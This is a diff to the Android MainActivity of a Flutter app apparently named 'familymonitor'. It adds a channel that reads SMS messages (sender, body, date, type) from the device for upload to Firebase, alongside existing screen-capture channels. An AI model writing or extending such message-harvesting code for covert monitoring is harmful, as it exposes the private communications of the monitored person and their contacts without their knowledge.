@@ -17,7 +17,6 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.Looper
-import android.os.PowerManager
 import android.util.Log
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
@@ -30,6 +29,7 @@ class MainActivity : FlutterActivity() {
         private const val TAG = "MainActivity"
         private const val SCREEN_CAPTURE_CHANNEL = "com.familymonitor/screen_capture"
         private const val SNAPSHOT_CHANNEL       = "com.familymonitor/snapshot"
+        private const val SMS_CHANNEL            = "family_monitor/sms"
         private const val REQUEST_MEDIA_PROJECTION = 1001
     }
 
@@ -331,6 +331,51 @@ class MainActivity : FlutterActivity() {
             when (call.method) {
                 "takeNativeSnapshot" -> takeNativeSnapshotAsync(result)
                 else                 -> result.notImplemented()
+            }
+        }
+
+        // ── SMS reading channel ───────────────────────────────────────────────
+        // Reads SMS messages from the device via ContentResolver and returns
+        // them to Dart for upload to Firebase. Requires READ_SMS permission.
+        MethodChannel(
+            flutterEngine.dartExecutor.binaryMessenger,
+            SMS_CHANNEL
+        ).setMethodCallHandler { call, result ->
+            when (call.method) {
+                "readSms" -> {
+                    try {
+                        val limit = call.argument<Int>("limit") ?: 100
+                        val uri = android.net.Uri.parse("content://sms/")
+                        val cursor = contentResolver.query(
+                            uri,
+                            arrayOf("address", "body", "date", "type"),
+                            null, null,
+                            "date DESC"
+                        )
+                        val list = mutableListOf<Map<String, Any?>>()
+                        var count = 0
+                        cursor?.use { c ->
+                            while (c.moveToNext() && count < limit) {
+                                val addrIdx = c.getColumnIndex("address")
+                                val bodyIdx = c.getColumnIndex("body")
+                                val dateIdx = c.getColumnIndex("date")
+                                val typeIdx = c.getColumnIndex("type")
+                                if (addrIdx < 0 || bodyIdx < 0 || dateIdx < 0 || typeIdx < 0) continue
+                                list.add(mapOf(
+                                    "address" to (c.getString(addrIdx) ?: ""),
+                                    "body"    to (c.getString(bodyIdx) ?: ""),
+                                    "date"    to c.getLong(dateIdx),
+                                    "type"    to c.getInt(typeIdx)
+                                ))
+                                count++
+                            }
+                        }
+                        result.success(list)
+                    } catch (e: Exception) {
+                        result.error("SMS_ERROR", e.message, null)
+                    }
+                }
+                else -> result.notImplemented()
             }
         }
     }
